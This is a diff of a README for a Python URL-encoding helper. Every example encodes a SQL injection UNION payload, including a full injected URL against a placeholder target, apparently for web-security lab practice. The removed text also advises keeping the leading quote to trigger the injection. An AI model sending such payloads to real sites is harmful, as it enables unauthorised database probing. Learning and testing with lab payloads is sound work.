@@ -18,116 +18,62 @@ It supports:
 ## Install
 
 ### Option A — Run locally
-
+```bash
 chmod +x urltool.py
 ./urltool.py -h
-
+```
 ###Option B — Install system-wide (recommended: /usr/local/bin)
-From the directory containing urltool.py:
 
+From the directory containing urltool.py:
+```
 chmod +x urltool.py
 sudo ln -sf "$(pwd)/urltool.py" /usr/local/bin/urltool
 urltool -h
+```
 Option C — Copy to /usr/bin
-bash
-Copy code
+```
 chmod +x urltool.py
 sudo cp -v urltool.py /usr/bin/urltool
 urltool -h
-Usage
-Help
-bash
-Copy code
-urltool -h
-urltool enc -h
-urltool dec -h
-urltool url -h
-Encode payloads
-1) Standard query encoding (spaces → +)
-bash
-Copy code
+```
+Commands
+Encode
+
+Standard (quote is kept as %27):
+
 urltool enc "' UNION SELECT @@version, NULL#"
-Example output:
+# -> %27+UNION+SELECT+%40%40version%2C+NULL%23
 
-perl
-Copy code
-%27+UNION+SELECT+%40%40version%2C+NULL%23
-2) Pretty mode (keeps @ and , readable)
-bash
-Copy code
+
+Pretty (keeps @@ and , readable):
+
 urltool enc "' UNION SELECT @@version, NULL#" --pretty
-Example output:
+# -> %27+UNION+SELECT+@@version,+NULL%23
 
-sql
-Copy code
-%27+UNION+SELECT+@@version,+NULL%23
-✅ Use this when you need the leading quote ' to break out of a quoted SQL context.
 
-3) WSA-style output (drops the leading encoded quote)
-This converts a leading %27+ into a leading +.
+WSA-style (converts leading %27+ to +):
 
-bash
-Copy code
 urltool enc "' UNION SELECT @@version, NULL#" --pretty --wsaplus
-Example output:
+# -> +UNION+SELECT+@@version,+NULL%23
 
-sql
-Copy code
-+UNION+SELECT+@@version,+NULL%23
-⚠️ This removes the leading ', so don’t use it if the SQLi requires that quote to trigger.
 
-4) Use %20 instead of + for spaces
-bash
-Copy code
+Use %20 for spaces instead of +:
+
 urltool enc "' UNION SELECT @@version, NULL#" --percent20
-5) Custom safe characters (override pretty)
-Keep specific characters unencoded:
 
-bash
-Copy code
+
+Custom safe chars (override --pretty):
+
 urltool enc "' UNION SELECT @@version, NULL#" --safe "@,()"
-Decode payloads
-1) Standard decode (treats + as space)
-bash
-Copy code
+
+Decode
 urltool dec "%27+UNION+SELECT+@@version,+NULL%23"
-2) Decode without treating + as space
-bash
-Copy code
+
+
+Don’t treat + as space:
+
 urltool dec "%27+UNION+SELECT+@@version,+NULL%23" --no-plus
-Build full URLs
-1) Build URL with encoded query parameter
-bash
-Copy code
+
+Build full URL
 urltool url "https://target.tld/filter" category "' UNION SELECT @@version, NULL#" --pretty
-Example output:
-
-sql
-Copy code
-https://target.tld/filter?category=%27+UNION+SELECT+@@version,+NULL%23
-2) Build URL with WSA-style leading +
-bash
-Copy code
-urltool url "https://target.tld/filter" category "' UNION SELECT @@version, NULL#" --pretty --wsaplus
-stdin / piping
-Encode from stdin
-bash
-Copy code
-echo "' UNION SELECT @@version, NULL#" | urltool enc --pretty
-Decode from stdin
-bash
-Copy code
-echo "%27+UNION+SELECT+@@version,+NULL%23" | urltool dec
-Typical workflows
-✅ When you NEED the quote ' to trigger SQLi
-Use pretty only:
-
-bash
-Copy code
-urltool enc "' UNION SELECT @@version, NULL#" --pretty
-✅ When you want “WSA example style” (starts with +UNION...)
-Use pretty + wsaplus:
-
-bash
-Copy code
-urltool enc "' UNION SELECT @@version, NULL#" --pretty --wsaplus
+# -> https://target.tld/filter?category=%27+UNION+SELECT+@@version,+NULL%23
